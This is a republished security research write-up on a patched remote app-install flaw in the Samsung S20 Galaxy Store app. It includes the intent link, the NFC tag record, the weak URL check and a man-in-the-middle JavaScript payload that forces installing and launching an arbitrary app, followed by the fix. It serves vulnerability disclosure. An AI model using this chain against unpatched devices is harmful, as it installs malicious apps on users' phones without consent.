---
layout: page
title: Samsung S20 - RCE Via Samsung Galaxy Store
permalink: /published-research/samsung-s20-rce-galaxy-store
---

#### Original post: [https://labs.f-secure.com/blog/samsung-s20-rce-via-samsung-galaxy-store-app/](https://labs.f-secure.com/blog/samsung-s20-rce-via-samsung-galaxy-store-app/)

## Description

F-Secure looked into exploiting the Samsung S20 device for Tokyo Pwn2Own 2020. An exploit chain was found for version 4.5.19.13 of the Galaxy Store application that could have allowed an attacker to install any application on the Galaxy Store without user consent. Samsung patched this vulnerability at the end of September 2020, no longer making it a viable entry for Pwn2Own.

This blog post will go over the technical details of this vulnerability and how F-Secure intended on exploiting this issue for Pwn2Own before it was patched. 

## Technical Details

Galaxy Store (`com.sec.android.app.samsungapps`) is the Samsung proprietary application store pre-installed on Samsung devices. The application is built to be a native Android application with a few WebView activities built in. Some of the WebView activities have JavaScript interfaces in order to provide additional functionality, such as installing and launching applications.

The WebView activity that F-Secure intended to use for Pwn2Own was `com.sec.android.app.samsungapps.slotpage.EditorialActivity`. This activity could be launched via two methods:

* Browsable intent link
	* `intent://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html#Intent;action=android.intent.action.VIEW;scheme=http;end`
* NFC Tag
	* Data MIME type: `application/com.sec.android.app.samsungapps.detail`
	* Data URI: `http://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html`

During runtime, the `EditorialActivity` activity loaded a WebView and checked if the user supplied `url` parameter was considered valid. The parameter was considered valid if it started with one of the two following values:

* `http://img.samsungapps.com/`
* `https://img.samsungapps.com/`

The method used to check the "url" parameter is below:

```
public boolean isValidUrl(String str) {
        return str.startsWith("http://img.samsungapps.com/") || 
        str.startsWith("https://img.samsungapps.com/");
}
```

If the above method returned true, then the WebView would proceed to load the user supplied URL and add a JavaScript interface to the WebView called `EditorialScriptInterface`. This interface contained two methods of interest: `downloadApp` and `openApp`.

The `downloadApp` method took a string value and passed that value to another method `e`. This new method executed the following actions:

* Checks if the WebView is loaded into a valid URL, using the same "isValidUrl" method above
* Requests to download an app from the Galaxy Store that had the same package name as the previously passed string value
*  If the package is found, download and install the package

The following pseudo code demonstrates how this entire process worked:

```
@JavascriptInterface
public void downloadApp(String str) {
        EditorialScriptInterface.this.e(str);
}
public void e(String str) {
        if (EditorialActivity.isValidUrl(WebView.getUrl() == false)) {
                Log.d("Editorial", 
                "Url is not valid" + 
                EditorialActivity.isValidUrl(WebView.getUrl());
                return;
        }
        String GUID = str;
        if (Store.search(GUID) == true) {
                Store.download(GUID);
        }
}
```

The `openApp` method had similar functionality, where it would pass a string value to the method `d` and executed the following actions:

* Checks if the WebView is loaded into a valid URL, using the same "isValidUrl" method above
* Attempts to launch an installed app with the same package name as the supplied string value

The following pseudo code demonstrates how this entire process works:

```
@JavascriptInterface
public void openApp(String str) {
        EditorialScriptInterface.this.d(str);
}
public void d(String str) {
        if (EditorialActivity.isValidUrl(WebView.getUrl() == false)) {
                Log.d("Editorial",
                "Url is not valid" +
                this.c.getUrl());
                return;
        }
        String GUID = str;
        if (Device.isInstalled(GUID) == true) {
                Device.openApp(GUID);
        }
}
```

## Attack Chain

A high level overview of the chain that F-Secure intended to use for Pwn2Own was:

* Phone is connected to an attacker controlled WiFi network or a public WiFi network the attacker resides on
* Phone scans a prepared NFC tag and launches the Galaxy Store application
* The Galaxy Store application automatically launches the `EditorialActivity` activity which also loads the JavaScript interface `EditorialScriptInterface`
* The loaded WebView browses to the URL `http://img.samsungapps.com/yaypayloadyay.html`
* The attacker intercepts the HTTP traffic and injects malicious JavaScript into the server's response
* Force the phone to install a malicious application from the Galaxy Store that the attacker has uploaded
* Force the phone to launch the newly installed malicious application

## NFC NDEF

A NFC tag can contain a number of NDEF records for exchanging information with a phone scanning it. F-Secure intended to use a NFC tag with the following record:

```
Record 0: (Media) application/com.sec.android.app.samsungapps.detail
        http://apps.samsung.com/appquery/EditorialPage.as?url=
        http://img.samsungapps.com/yaypayloadyay.html
```

## Man in the Middle Attack

If a Samsung S20 device scanned the above NFC tag, the Galaxy Store application would open the `EditorialActivity` activity which launches a WebView and loads the URL `http://img.samsungapps.com/yaypayloadyay.html`. This WebView would also contain the JavaScript interface `EditorialScriptInterface`.

Since the web page `http://img.samsungapps.com/yaypayloadyay.html` does not exist, the web server would respond with a "404 Not Found" HTTP error. However, due to the communications using clear text HTTP, it would be possible for a correctly positioned attacker to conduct a Man-in-the-Middle (MitM) attack and inject additional JavaScript into the server's HTTP response.

The following example JavaScript code could be injected into the server's HTTP response to automatically download and install any application from the Galaxy Store, and then trigger the opening of that application:

```
<script>
function openApp(){
        setTimeout(function(){
                GalaxyStore.openApp("<packageName>");
        },5000);
}

// download and install "<packageName>"
GalaxyStore.downloadApp("<packageName>");
// open "<packagename>" 5 seconds after this page has loaded
openApp();
</script>
```

## Remediation and Mitigation

Samsung has released version 4.5.20.7 of the Galaxy Store application, which modified the `isValidUrl` method to the following:

```
public boolean isValidUrl(String str) {
        return str.startsWith("https://img.samsungapps.com/");
}
```

As per above, the `url` parameter must now start with `https://img.samsungapps.com/`, which makes MitM attacks significantly more difficult. This change affects:

* If the "EditorialActivity" WebView is able to load the user provided URL
* If the "downloadApp" JavaScript interface method is allowed to execute
* If the "openApp" JavaScript interface method is allowed to execute

It should be noted that this new version of the Galaxy Store may not come pre-installed with the October 2020 firmware for Samsung S20 devices. If this is the case, a user must manually open the Galaxy Store application, which will then prompt the user to install a newer version of the application.

F-Secure found that if a user is still running a vulnerable version of the Galaxy Store application, and is never prompted to update their application, then this attack is still exploitable against that specific user. This is because launching the "EditorialActivity" activity skips all update checks that the Galaxy Store application should be running on boot. 

It is recommended that all Samsung S20 users (and potentially all Samsung device users in general) open their Galaxy Store application at least once so that they are prompted to update to the latest version.